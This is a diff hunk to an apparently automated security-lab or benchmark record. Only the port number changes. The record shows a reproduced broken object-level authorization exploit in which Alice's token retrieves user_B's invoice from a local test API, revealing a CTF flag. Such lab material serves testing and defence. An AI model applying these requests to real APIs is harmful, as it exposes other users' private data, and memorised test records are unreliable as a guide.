@@ -16,17 +16,17 @@
     "exploit_reproduced": true,
     "exchanges": [
       {
-        "request": "$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:64398/api/invoices/1\n",
+        "request": "$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:49293/api/invoices/1\n",
         "response_status": 200,
         "response_body": "{\"id\":1,\"owner_id\":\"user_A\",\"customer\":\"Acme Corp\",\"amount\":1200,\"note\":\"Q3 retainer\"}"
       },
       {
-        "request": "$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:64398/api/invoices/2\n",
+        "request": "$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:49293/api/invoices/2\n",
         "response_status": 200,
         "response_body": "{\"id\":2,\"owner_id\":\"user_B\",\"customer\":\"Globex Inc\",\"amount\":9000,\"note\":\"FLAG{bola_user_b_invoice_pwned}\"}"
       },
       {
-        "request": "$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:64398/api/me/invoices\n",
+        "request": "$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:49293/api/me/invoices\n",
         "response_status": 200,
         "response_body": "[{\"id\":1,\"owner_id\":\"user_A\",\"customer\":\"Acme Corp\",\"amount\":1200,\"note\":\"Q3 retainer\"}]"
       }
